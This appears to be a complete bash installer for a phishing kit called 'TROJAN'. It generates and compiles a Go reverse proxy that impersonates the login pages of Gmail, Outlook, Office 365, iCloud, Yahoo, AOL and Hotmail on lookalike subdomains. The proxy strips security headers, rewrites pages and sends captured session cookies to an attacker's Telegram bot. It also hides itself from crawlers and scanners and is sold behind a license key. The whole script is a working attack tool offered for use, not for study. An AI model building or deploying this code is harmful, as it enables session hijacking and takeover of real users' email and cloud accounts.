#!/bin/bash
# 🏛️ TROJAN - ABSOLUTE STEALTH (V17.0) - SELF-HEALING BUILD
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗       ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
echo -e "${CYAN}[...] Cleaning Environment & Ports...${NC}"
mkdir -p /root/TrojanProject
sudo fuser -k 80/tcp 443/tcp &> /dev/null
DEPS=(curl dig jq ufw git wget)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done

# --- 2. GOLANG ENGINE INSTALL ---
if ! command -v go &> /dev/null; then
    echo -e "${CYAN}[...] Installing Go 1.22...${NC}"
    wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz &> /dev/null
    sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
fi
export PATH=$PATH:/usr/local/go/bin

# --- 3. MASTER LICENSE GATE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 4. EXFILTRATION & DOMAIN SETUP ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Bot Offline.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID

VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain (e.g. site.com): " USER_DOMAIN
    DNS_CHECK=$(dig +short $USER_DOMAIN | tail -n1)
    if [[ "$DNS_CHECK" == "$VPS_IP" ]]; then
        echo -e "${GREEN}[success] DNS Propagation Confirmed.${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch ($DNS_CHECK). Point $USER_DOMAIN to $VPS_IP.${NC}"
        read -p "Ignore and continue? (y/n): " CONT
        [[ "$CONT" == "y" ]] && break
    fi
done

# --- 5. AUTOMATED FILE RESTORATION (THE ENGINE REBUILD) ---
echo -e "${CYAN}[...] Restoring Engine Files (Self-Healing)...${NC}"

# A. Create main.go
cat << EOF > /root/TrojanProject/main.go
package main
import (
	"fmt"
	"net/http"
	"github.com/caddyserver/certmagic"
)
func main() {
	base := "$USER_DOMAIN"
	fmt.Println("\033[1;35m🏛️  TROJAN MULTI-TARGET ENGINE v17.0\033[0m")
	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = "admin@" + base
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if IsBot(r) { http.NotFound(w, r); return }
		target := GetTargetConfig(r.Host)
		ProxyTarget(target, w, r)
	})
	domains := []string{base, "gmail."+base, "outlook."+base, "office."+base, "icloud."+base, "yahoo."+base, "aol."+base, "hotmail."+base}
	certmagic.HTTPS(domains, mux)
}
EOF

# B. Create proxy.go
cat << 'EOF' > /root/TrojanProject/proxy.go
package main
import (
	"bytes"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"fmt"
)
func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
	remote, _ := url.Parse("https://" + t.BaseDomain)
	proxy := httputil.NewSingleHostReverseProxy(remote)
	r.Host = remote.Host
	r.URL.Host = remote.Host
	r.URL.Scheme = remote.Scheme
	proxy.ModifyResponse = func(resp *http.Response) error {
		loc := resp.Header.Get("Location")
		if loc != "" {
			newLoc := strings.ReplaceAll(loc, t.BaseDomain, r.Host)
			resp.Header.Set("Location", newLoc)
		}
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("X-Frame-Options")
		if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
			body, _ := io.ReadAll(resp.Body)
			content := strings.ReplaceAll(string(body), t.BaseDomain, r.Host)
			resp.Body = io.NopCloser(bytes.NewBufferString(content))
			resp.ContentLength = int64(len(content))
			resp.Header.Set("Content-Length", fmt.Sprint(len(content)))
		}
		for _, c := range resp.Cookies() {
			SendToTelegram(fmt.Sprintf("🎯 [%s] Hit! Cookie: %s=%s", t.Name, c.Name, c.Value))
		}
		return nil
	}
	proxy.ServeHTTP(w, r)
}
EOF

# C. Create telegram.go
cat << EOF > /root/TrojanProject/telegram.go
package main
import ("net/http"; "net/url")
func SendToTelegram(text string) {
	token := "$TG_TOKEN"
	chatID := "$TG_ID"
	apiURL := "https://api.telegram.org/bot" + token + "/sendMessage"
	http.PostForm(apiURL, url.Values{"chat_id": {chatID}, "text": {text}})
}
EOF

# D. Create targets.go
cat << 'EOF' > /root/TrojanProject/targets.go
package main
import "strings"
type Target struct { Name, BaseDomain string; AuthCookies []string }
func GetTargetConfig(host string) *Target {
	host = strings.ToLower(host)
	targets := map[string]*Target{
		"gmail":   {"Gmail", "accounts.google.com", []string{"SID"}},
		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth"}},
		"office":  {"Office", "login.microsoftonline.com", []string{"ESTSAUTH"}},
		"icloud":  {"iCloud", "idmsa.apple.com", []string{"session_token"}},
		"yahoo":   {"Yahoo", "login.yahoo.com", []string{"B"}},
		"aol":     {"AOL", "login.aol.com", []string{"B"}},
		"hotmail": {"Hotmail", "login.live.com", []string{"MSPAuth"}},
	}
	for k, v := range targets { if strings.Contains(host, k) { return v } }
	return targets["office"]
}
EOF

# E. Create gatekeeper.go
cat << 'EOF' > /root/TrojanProject/gatekeeper.go
package main
import ("net/http"; "strings")
func IsBot(r *http.Request) bool {
	ua := strings.ToLower(r.Header.Get("User-Agent"))
	botSigs := []string{"bot", "crawler", "spider", "scan", "python", "curl"}
	for _, sig := range botSigs { if strings.Contains(ua, sig) { return true } }
	if ua == "" { return true }
	return false
}
EOF

# --- 6. FINAL BUILD ---
echo -e "${CYAN}[...] Compiling Titanium Binary...${NC}"
cd /root/TrojanProject
go mod tidy &> /dev/null
go get github.com/caddyserver/certmagic &> /dev/null
go build -o TrojanTerminal main.go proxy.go targets.go telegram.go gatekeeper.go
chmod +x TrojanTerminal

# --- 7. DEPLOY RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
clear
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
cd /root/TrojanProject && ./TrojanTerminal
EOF
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

echo -e "${GREEN}[success] Build Complete. Type 'Run' to start.${NC}"
